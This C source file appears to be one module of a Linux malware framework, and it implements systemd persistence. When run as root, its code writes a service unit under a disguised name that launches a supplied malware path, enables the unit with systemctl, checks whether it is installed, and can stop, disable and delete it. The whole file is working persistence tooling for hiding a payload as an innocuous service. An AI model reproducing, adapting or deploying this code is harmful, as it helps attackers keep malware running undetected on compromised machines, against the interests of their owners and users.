#pragma region RequiredLibraries

	#include <stdio.h>
	#include <stdlib.h>
	#include <string.h>
	#include "../../headers/modules/module.h"
	#include "../../headers/helpers/helpers.h"
	#include "../../headers/helpers/platform_dependent.h"
	#include "../../headers/errors/codes.h"

#pragma endregion

#pragma region Configuration

	#define        SERVICE_UNIT_FILES_LOCATION       "/etc/systemd/system"
	#define        UNIT_FILE_EXTENSION               ".service"

	#define        UNIT_FILE_BUFFER_SIZE             256
	#define        UNIT_FILE_FORMAT                  "\n[Unit]\nDescription=%s service\n\n[Service]\nType=simple\n\nExecStart=%s\n\n[Install]\nWantedBy=multi-user.target\n"

	#define        COMMAND_BUFFER_SIZE               128
	#define        ENABLE_COMMAND_ENABLE_FORMAT      "systemctl enable %s" STDERR_TO_STDOUT
	#define        CHECK_COMMAND_FORMAT              "service %s status" STDERR_TO_STDOUT "| grep -cw 'active\\|loaded'" STDERR_TO_STDOUT
	#define        REMOVE_COMMAND_FORMAT             "systemctl stop %s" STDERR_TO_STDOUT "; systemctl disable %s " STDERR_TO_STDOUT "; rm %s" STDERR_TO_STDOUT

	#define        OUTPUT_IS_PRESENT                 "1\n\0"

#pragma endregion

#pragma region GlobalVariables

	char *unit_filename = NULL;
	char *unit_path = NULL;

#pragma endregion

#pragma region GlobalVariablesMethods

int are_globals_inited(){

	if (unit_filename == NULL || unit_path == NULL)
		return 0;
	else
		return 1;

}

int init_globals(ENVIRONMENT *env){

	// Get the path of the unit file
	copy_string(&unit_filename, env->fake_name, sizeof(UNIT_FILE_EXTENSION) + 1);
	strcat(unit_filename, UNIT_FILE_EXTENSION);
	concat_path_with_filename(&unit_path, SERVICE_UNIT_FILES_LOCATION, unit_filename);

	// Return
	return 0;

}

#pragma endregion

#pragma region SharedObjectEvents

void __attribute__ ((destructor)) on_dlclose(void){

	if (unit_path != NULL)
		free(unit_path);
	if (unit_filename != NULL)
		free(unit_filename);

}

#pragma endregion

#pragma region ModuleMethods

extern int is_compatible(ENVIRONMENT *env){

	if (!are_globals_inited())
		init_globals(env);

	// Can be exploited only with root
	return env->is_root;

};

extern int exploit(ENVIRONMENT *env){

	char unit_content[UNIT_FILE_BUFFER_SIZE];
	char enable_command[COMMAND_BUFFER_SIZE];
	char *enable_command_output = NULL;
	int ret_val;

	if (!are_globals_inited())
		init_globals(env);

	// Create the file
	ret_val = sprintf(unit_content, UNIT_FILE_FORMAT, env->fake_name, env->malware_path);
	if (ret_val < 0)
		return ERROR_OPERATING_SYSTEM_UNABLE_TO_PRINT;
	create_file(unit_path, unit_content);

	// Execute the command for service adding
	ret_val = sprintf(enable_command, ENABLE_COMMAND_ENABLE_FORMAT, unit_filename);
	if (ret_val < 0)
		return ERROR_OPERATING_SYSTEM_UNABLE_TO_PRINT;
	execute_command(enable_command, &enable_command_output);

	// Free
	free(enable_command_output);

	// Return
	return 0;

}

extern int is_installed(ENVIRONMENT *env){

	if (!are_globals_inited())
		init_globals(env);

	if (has_privilege(unit_path, READ) == 1)
		return 1;
	else
		return 0;

}

extern int delete_installed(ENVIRONMENT *env){

	char remove_command[COMMAND_BUFFER_SIZE];
	char *remove_command_output = NULL;
	int ret_val;

	if (!are_globals_inited())
		init_globals(env);

	// Execute the command for removing the service
	ret_val = sprintf(remove_command, REMOVE_COMMAND_FORMAT, env->fake_name, env->fake_name, unit_path);
	if (ret_val < 0)
		return ERROR_OPERATING_SYSTEM_UNABLE_TO_PRINT;
	execute_command(remove_command, &remove_command_output);
	if (remove_command_output != NULL)
		free(remove_command_output);

	// Return
	return 0;

}

#pragma endregion